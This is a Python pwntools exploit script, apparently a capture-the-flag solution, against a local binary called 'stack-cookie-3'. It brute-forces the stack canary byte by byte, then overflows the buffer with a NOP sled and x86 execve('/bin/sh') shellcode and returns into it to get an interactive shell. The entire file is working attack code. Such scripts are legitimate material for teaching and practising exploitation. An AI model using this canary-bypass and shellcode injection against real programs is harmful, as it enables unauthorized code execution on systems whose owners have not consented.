#!/usr/bin/env python
from pwn import *

SHELLCODE = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'
env = {
        "asdf" : "\x90" * 30000 + SHELLCODE
        }

p = process('./stack-cookie-3',env=env)

length = 130
for i in range(256):
    print p.recvrepeat(0.01)
    p.sendline(str(length))
    print p.recvrepeat(0.01)
    string = "A"*128 + '\x00' + chr(i)
    #print(string)
    p.send(string)
    line = p.recvrepeat(0.01)
    if 'smashing' not in line:
        c = i
        length = 131
        break

length = 132
p.sendline(str(length))
print p.recvrepeat(0.01)
string = "A"*128 + '\x00' + chr(c) + chr(0)
print(string)
p.send(string)
line = p.recvrepeat(0.01)
print(line)

for i in range(256):
    print p.recvrepeat(0.01)
    p.sendline(str(length))
    print p.recvrepeat(0.01)
    string = "A"*128 + '\x00' + chr(c) + chr(i)
    #print(string)
    p.send(string)
    line = p.recvrepeat(0.01)
    if 'smashing' not in line:
        sec = i
        #length = 131
        break

length = 134
p.sendline(str(length))
print p.recvrepeat(0.01)
string = "A"*128 + '\x00' + chr(c) + chr(sec) + chr(0)
#print(string)
p.send(string)
line = p.recvrepeat(0.01)
print(line)


for i in range(256):
    print p.recvrepeat(0.01)
    p.sendline(str(length))
    print p.recvrepeat(0.01)
    string = "A"*128 + '\x00' + chr(c) + chr(sec) + chr(i)
    #print(string)
    p.send(string)
    line = p.recvrepeat(0.01)
    if 'smashing' not in line:
        c3 = i
        #length = 131
        break

line = p.recvrepeat(0.01)
print(line)

#c = Core('core')
#buff_addr = c.stack.find('A'*128)
#print("BUFFER:")
#print(buff_addr)
buff_addr = 0xffffd438
string = "\x90"*(0x80 - len(SHELLCODE) - 30) + SHELLCODE + "\x90" * 30 + chr(0) + chr(c) + chr(sec) + chr(c3) + "AAAA"*3 + p32(buff_addr)

raw_input("press enter")

length = len(string)
p.sendline(str(length))

print(string)
print p.recvrepeat(0.01)
p.send(string)
print p.recvrepeat(0.01)
p.interactive()

print('\x00'+chr(c)+chr(sec)+chr(c3))
